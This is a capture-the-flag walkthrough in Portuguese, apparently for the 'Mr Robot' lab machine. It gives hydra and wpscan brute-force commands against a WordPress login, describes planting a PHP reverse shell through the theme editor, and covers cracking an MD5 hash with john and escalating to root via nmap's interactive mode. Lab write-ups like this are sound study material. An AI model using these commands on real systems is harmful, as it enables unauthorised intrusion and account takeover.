@@ -1,0 +1,41 @@
+ip = 10.10.168.23
+
+A primeira coisa a se fazer é procurar o robots.txt e voila
+robots.txt
+User-agent: *
+fsocity.dic
+ -> Retornou uma wordlist
+key-1-of-3.txt
+ -> 073403c8a58a1f80d943455fb30724b9
+ 
+ Para organizar a wordlist e retirar as duplicatas:
+ sort fsocity.dic | uniq > fsocityOrganized.dic
+ 
+Pelo gobuster encontrei o diretório login e acessando vemos um formulário WordPress
+Para descobrir o usuário
+hydra -L files/fsocityOrganized.dic -p random 10.10.168.23 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username" -V
+
+Para descobrir a senha:
+1) hydra -L Elliot -p files/fsocityOrganized.dic 10.10.168.23 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username" -V
+ou
+2) wpscan -v -U Elliot -P files/fsocityOrganized.dic --url http://10.10.168.23/wp-login.php
+
+Após conseguir o acesso, na pasta de editor de temas, coloquei no tema "archive" um reverse shell de php
+Coloquei o netcat em escuta na minha máquina e acessei a url: 
+http://10.10.168.23/wp-content/themes/twentyfifteen/archive.php
+Para assim abrir o backdoor
+
+Lancei um bash interativo
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+E fui até a pasta local do robot e encontrei a segunda bandeira, mas junto tinha uma senha criptografa em md5:
+robot:c3fcd3d76192e4007dfb496cca67e13b
+A bandeira eu não tinha permissão de leitura
+Rodando o john Ther Ripper:
+john passwordRobot.raw-md5 --wordlist=fsocityOrganized.dic --format=raw-md5
+encontrei q a senha era: abcdefghijklmnopqrstuvwxyz
+E agora mudando para o usuário robot resgatei a bandeira: 822c73956184f694993bede3eb39f959
+
+Levantei um webserver python e baixei o linpeas na máquina alvo já rodando.
+Ao analisar o retorno do linpeas vi que tinha um nmap na máquina e vendo o "--help" dele vi q tinha uma opção chamada --interactive, rodei o nmap com esse parâmetro e ele tinha a opção de rodar um comando bash
+Colocando o whoami deste modo percebi que ele executava como root, fui direto a pasta sudo e capturei a última flag:
+04787ddef27c3dee1ee161b21670b4e4
